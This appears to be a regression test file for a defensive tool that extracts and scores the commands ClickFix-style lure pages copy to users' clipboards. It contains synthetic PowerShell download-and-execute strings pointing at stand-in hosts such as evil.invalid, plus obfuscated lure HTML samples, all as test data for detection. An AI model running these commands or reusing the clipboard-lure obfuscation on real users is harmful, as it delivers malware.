"""Extraction regression tests.

Every supported recovery method gets a test, and so does every failure mode,
so that hardening the extractor against a new lure cannot silently break an
older one. All tests are offline: they drive the pure text-level functions,
never the network layers.

The sample commands here are synthetic and are never executed -- they only
ever exist as strings compared against expected strings.
"""

import base64
import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "clickfix"))

from config import SanitizeConfig  # noqa: E402
from extractor import (  # noqa: E402
    FAIL_NO_COMMAND,
    FAIL_UNSUPPORTED,
    extract_from_text,
    gather_candidates,
    looks_like_command,
    select_best,
)
from jsdecode import eval_expr, resolve_variables, split_top_level  # noqa: E402
from sanitize import evaluate  # noqa: E402

PS = 'powershell -w hidden -nop -c "iex(irm http://example.invalid/a.ps1)"'


def b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


class TestClipboardLiteral(unittest.TestCase):
    def test_writetext_double_quoted(self):
        html = f'<script>navigator.clipboard.writeText("{PS}");</script>'
        r = extract_from_text(html)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.method, "clipboard_writetext")

    def test_writetext_single_quoted(self):
        html = "<script>navigator.clipboard.writeText('powershell -nop -w hidden');</script>"
        self.assertEqual(extract_from_text(html).command_text, "powershell -nop -w hidden")

    def test_writetext_backtick_template(self):
        html = "<script>navigator.clipboard.writeText(`powershell -enc AAAA`);</script>"
        self.assertEqual(extract_from_text(html).command_text, "powershell -enc AAAA")

    def test_writetext_html_entities(self):
        html = '<script>navigator.clipboard.writeText("powershell -c &quot;iex 1&quot;");</script>'
        self.assertIn('"iex 1"', extract_from_text(html).command_text)


class TestVariableIndirection(unittest.TestCase):
    def test_simple_variable(self):
        html = f'<script>var cmd = "{PS}"; navigator.clipboard.writeText(cmd);</script>'
        r = extract_from_text(html)
        self.assertEqual(r.command_text, PS)

    def test_variable_without_semicolon(self):
        html = f'<script>\nlet cmd = "{PS}"\nnavigator.clipboard.writeText(cmd)\n</script>'
        self.assertEqual(extract_from_text(html).command_text, PS)

    def test_variable_chain(self):
        # a -> b -> c, only c reaches the clipboard.
        html = (
            '<script>var a = "powershell"; var b = a + " -w hidden";'
            ' var c = b + " -enc QQBB"; navigator.clipboard.writeText(c);</script>'
        )
        self.assertEqual(extract_from_text(html).command_text, "powershell -w hidden -enc QQBB")

    def test_template_literal_with_nested_call(self):
        # `${atob(h)}` -- a placeholder holding an expression, not a bare name.
        html = (
            f'<script>var h = "{b64("http://evil.invalid/s.ps1")}";'
            ' var cmd = `powershell -nop -c iex(irm ${atob(h)})`;'
            " navigator.clipboard.writeText(cmd);</script>"
        )
        self.assertEqual(
            extract_from_text(html).command_text,
            "powershell -nop -c iex(irm http://evil.invalid/s.ps1)",
        )

    def test_template_literal_multiple_placeholders(self):
        html = (
            '<script>var p = "powershell"; var f = "-w hidden";'
            " var cmd = `${p} ${f} -nop`; navigator.clipboard.writeText(cmd);</script>"
        )
        self.assertEqual(extract_from_text(html).command_text, "powershell -w hidden -nop")

    def test_unresolvable_placeholder_is_not_emitted_raw(self):
        # Emitting a literal "${...}" would detonate a broken command in the
        # sandbox and produce a misleading report.
        html = "<script>navigator.clipboard.writeText(`powershell ${mystery(1)}`);</script>"
        r = extract_from_text(html)
        self.assertIsNone(r.command_text)
        self.assertEqual(r.failure_reason, FAIL_UNSUPPORTED)

    def test_template_literal_interpolation(self):
        html = (
            '<script>var host = "http://evil.invalid/x.ps1";'
            " var cmd = `powershell -nop -c iex(irm ${host})`;"
            " navigator.clipboard.writeText(cmd);</script>"
        )
        self.assertEqual(
            extract_from_text(html).command_text,
            "powershell -nop -c iex(irm http://evil.invalid/x.ps1)",
        )


class TestConcatenation(unittest.TestCase):
    def test_inline_concat(self):
        html = '<script>navigator.clipboard.writeText("power" + "shell" + " -w hidden");</script>'
        self.assertEqual(extract_from_text(html).command_text, "powershell -w hidden")

    def test_concat_preserves_plus_inside_string(self):
        # Regression: a greedy quote match used to swallow the " + " separator.
        html = '<script>navigator.clipboard.writeText("powershell -c a" + "+b");</script>'
        self.assertEqual(extract_from_text(html).command_text, "powershell -c a+b")

    def test_concat_of_vars_and_literals(self):
        html = (
            '<script>var p = "powershell"; '
            'navigator.clipboard.writeText(p + " -enc " + "QQBB");</script>'
        )
        self.assertEqual(extract_from_text(html).command_text, "powershell -enc QQBB")


class TestBase64(unittest.TestCase):
    def test_atob_literal_inline(self):
        html = f'<script>navigator.clipboard.writeText(atob("{b64(PS)}"));</script>'
        self.assertEqual(extract_from_text(html).command_text, PS)

    def test_atob_variable(self):
        html = (
            f'<script>var e = "{b64(PS)}"; navigator.clipboard.writeText(atob(e));</script>'
        )
        self.assertEqual(extract_from_text(html).command_text, PS)

    def test_atob_concat_blob(self):
        blob = b64(PS)
        half = len(blob) // 2
        html = (
            f'<script>navigator.clipboard.writeText(atob("{blob[:half]}" + "{blob[half:]}"));</script>'
        )
        self.assertEqual(extract_from_text(html).command_text, PS)

    def test_atob_bare_without_clipboard(self):
        html = f'<script>var junk = atob("{b64(PS)}");</script>'
        r = extract_from_text(html)
        self.assertEqual(r.command_text, PS)

    def test_utf16le_encoded_powershell_blob(self):
        payload = "powershell -w hidden -c iex 1"
        blob = base64.b64encode(payload.encode("utf-16-le")).decode()
        html = f'<script>navigator.clipboard.writeText(atob("{blob}"));</script>'
        self.assertEqual(extract_from_text(html).command_text, payload)


class TestCharCode(unittest.TestCase):
    def test_fromcharcode(self):
        codes = ",".join(str(ord(c)) for c in "powershell -nop")
        html = f"<script>navigator.clipboard.writeText(String.fromCharCode({codes}));</script>"
        self.assertEqual(extract_from_text(html).command_text, "powershell -nop")

    def test_fromcharcode_hex(self):
        codes = ",".join(hex(ord(c)) for c in "powershell -w hidden")
        html = f"<script>var c = String.fromCharCode({codes}); navigator.clipboard.writeText(c);</script>"
        self.assertEqual(extract_from_text(html).command_text, "powershell -w hidden")


class TestOtherObfuscation(unittest.TestCase):
    def test_reversed_string(self):
        html = (
            '<script>var c = "neddih w- llehsrewop".split("").reverse().join("");'
            " navigator.clipboard.writeText(c);</script>"
        )
        self.assertEqual(extract_from_text(html).command_text, "powershell -w hidden")

    def test_decodeuricomponent(self):
        html = '<script>navigator.clipboard.writeText(decodeURIComponent("powershell%20-nop"));</script>'
        self.assertEqual(extract_from_text(html).command_text, "powershell -nop")

    def test_split_join_substitution(self):
        html = (
            '<script>var c = "powershellXX-wXXhidden".split("XX").join(" ");'
            " navigator.clipboard.writeText(c);</script>"
        )
        self.assertEqual(extract_from_text(html).command_text, "powershell -w hidden")

    def test_replace_substitution(self):
        html = (
            "<script>var c = \"powershell@@-nop\".replace('@@', ' ');"
            " navigator.clipboard.writeText(c);</script>"
        )
        self.assertEqual(extract_from_text(html).command_text, "powershell -nop")

    def test_unicode_escape(self):
        html = '<script>navigator.clipboard.writeText("powershell\\u0020-nop");</script>'
        self.assertEqual(extract_from_text(html).command_text, "powershell -nop")


class TestMarkupCarriers(unittest.TestCase):
    def test_hidden_textarea(self):
        html = f'<textarea id="c" style="display:none">{PS}</textarea>'
        r = extract_from_text(html)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.method, "textarea")

    def test_hidden_input(self):
        # Inner double quotes must be entity-escaped to be valid HTML; that is
        # what real lures emit, and the entity has to survive decoding.
        html = f'<input type="hidden" id="p" value="{PS.replace(chr(34), "&quot;")}">'
        r = extract_from_text(html)
        self.assertEqual(r.command_text, PS)

    def test_hidden_input_single_quoted_attribute(self):
        html = f"<input type='hidden' id='p' value='{PS}'>"
        r = extract_from_text(html)
        self.assertEqual(r.command_text, PS)

    def test_data_clipboard_attribute(self):
        html = f'<button data-clipboard-text="{PS.replace(chr(34), "&quot;")}">Verify</button>'
        r = extract_from_text(html)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.method, "data_clipboard_attr")

    def test_value_assignment_then_execcommand(self):
        html = (
            f'<textarea id="t"></textarea><script>document.getElementById("t").value = "{PS}";'
            ' document.execCommand("copy");</script>'
        )
        self.assertEqual(extract_from_text(html).command_text, PS)

    def test_setdata_clipboard_event(self):
        html = f"<script>e.clipboardData.setData('text/plain', '{PS}');</script>"
        r = extract_from_text(html)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.method, "setdata_clipboard")

    def test_document_write_wrapper(self):
        inner = f'<textarea>{PS}</textarea>'
        html = f"<script>document.write('{inner}');</script>"
        self.assertEqual(extract_from_text(html).command_text, PS)


class TestIframeAndRawFallback(unittest.TestCase):
    def test_iframe_srcdoc(self):
        # srcdoc holds an escaped document; inner quotes must be entities too.
        inner = f"&lt;textarea&gt;{PS.replace(chr(34), '&quot;')}&lt;/textarea&gt;"
        html = f'<iframe srcdoc="{inner}"></iframe>'
        r = extract_from_text(html)
        self.assertEqual(r.command_text, PS)

    def test_raw_line_fallback_skips_javascript_source(self):
        html = '<script>navigator.clipboard.writeText(buildIt());</script>'
        r = extract_from_text(html)
        self.assertIsNone(r.command_text)

    def test_raw_line_fallback_keeps_text_drops_tags(self):
        html = '<div class="step"><code>powershell -w hidden -nop</code></div>'
        r = extract_from_text(html)
        self.assertEqual(r.command_text, "powershell -w hidden -nop")

    def test_raw_line_fallback(self):
        html = f"<div class=step>{PS}</div>"
        r = extract_from_text(html)
        self.assertIn("powershell", (r.command_text or "").lower())
        self.assertEqual(r.method, "raw_line")


class TestSelectionRanking(unittest.TestCase):
    def test_clipboard_beats_decoy_textarea(self):
        html = (
            '<textarea>notepad.exe harmless decoy that is quite long indeed</textarea>'
            f'<script>navigator.clipboard.writeText("{PS}");</script>'
        )
        r = extract_from_text(html)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.method, "clipboard_writetext")

    def test_command_marker_beats_longer_noise(self):
        html = (
            '<input type="hidden" value="' + "x" * 500 + '">'
            '<script>navigator.clipboard.writeText("powershell -nop");</script>'
        )
        self.assertEqual(extract_from_text(html).command_text, "powershell -nop")


class TestFailureModes(unittest.TestCase):
    def test_empty_page(self):
        r = extract_from_text("")
        self.assertIsNone(r.command_text)
        self.assertEqual(r.failure_reason, FAIL_NO_COMMAND)

    def test_benign_page_no_command(self):
        html = "<html><body><h1>Verify you are human</h1><p>Click the box.</p></body></html>"
        r = extract_from_text(html)
        self.assertIsNone(r.command_text)
        self.assertEqual(r.failure_reason, FAIL_NO_COMMAND)

    def test_unsupported_obfuscation_is_reported(self):
        # A clipboard write whose argument we cannot statically evaluate must
        # be reported as unsupported, never silently treated as "no command".
        html = "<script>navigator.clipboard.writeText(buildPayload(seed, 7));</script>"
        r = extract_from_text(html)
        self.assertIsNone(r.command_text)
        self.assertEqual(r.failure_reason, FAIL_UNSUPPORTED)
        self.assertTrue(any(FAIL_UNSUPPORTED in n for n in r.notes))

    def test_execcommand_copy_without_source_is_noted(self):
        html = '<script>document.execCommand("copy");</script>'
        r = extract_from_text(html)
        self.assertIsNone(r.command_text)
        self.assertTrue(any("execcommand_copy" in n for n in r.notes))

    def test_malformed_base64_is_rejected_not_guessed(self):
        # Python's b64decode silently drops non-alphabet bytes, which would
        # turn page prose into binary noise masquerading as a command.
        html = '<script>navigator.clipboard.writeText(atob("!!!!not base64 at all!!!!"));</script>'
        r = extract_from_text(html)
        self.assertIsNone(r.command_text)

    def test_binary_base64_is_rejected(self):
        blob = base64.b64encode(bytes(range(0, 40))).decode()
        html = f'<script>navigator.clipboard.writeText(atob("{blob}"));</script>'
        self.assertIsNone(extract_from_text(html).command_text)

    def test_truncated_script_tag(self):
        html = '<script>navigator.clipboard.writeText("powershell -nop'
        r = extract_from_text(html)  # must not raise
        self.assertIsNotNone(r)


class TestJsDecodePrimitives(unittest.TestCase):
    def test_split_top_level_respects_quotes(self):
        self.assertEqual(split_top_level('"a+b" + c', "+"), ['"a+b"', "c"])

    def test_split_top_level_respects_parens(self):
        self.assertEqual(split_top_level("f(a,b), c", ","), ["f(a,b)", "c"])

    def test_resolve_variables_multi_pass(self):
        v = resolve_variables('var a = "1"; var b = a + "2"; var c = b + "3";')
        self.assertEqual(v["c"], "123")

    def test_eval_expr_returns_none_for_unknown_call(self):
        self.assertIsNone(eval_expr("mystery(1,2)", {}))

    def test_eval_expr_depth_guard(self):
        self.assertIsNone(eval_expr("atob(" * 30 + '"QQ=="' + ")" * 30, {}))


class TestSanitizeIntegration(unittest.TestCase):
    def setUp(self):
        self.cfg = SanitizeConfig()

    def test_strips_zero_width_characters(self):
        poisoned = "power​shell‍ -nop"
        r = evaluate(poisoned, self.cfg)
        self.assertEqual(r.normalized_text, "powershell -nop")

    def test_scores_strong_markers(self):
        r = evaluate(PS, self.cfg)
        self.assertGreaterEqual(r.score, 2)
        self.assertTrue(r.auto_approve)

    def test_hash_is_stable_across_invisible_variants(self):
        a = evaluate("powershell -nop", self.cfg)
        b = evaluate("power​shell -nop", self.cfg)
        self.assertEqual(a.sha256, b.sha256)

    def test_length_bounds_block_autoapprove(self):
        r = evaluate("iex", self.cfg)
        self.assertFalse(r.auto_approve)


class TestLooksLikeCommand(unittest.TestCase):
    def test_positive(self):
        for s in ("powershell -nop", "mshta http://x", "IEX(IRM http://x)", "cmd /c calc"):
            self.assertTrue(looks_like_command(s), s)

    def test_negative(self):
        for s in ("please click here", "verify you are human", ""):
            self.assertFalse(looks_like_command(s), s)


if __name__ == "__main__":
    unittest.main(verbosity=2)
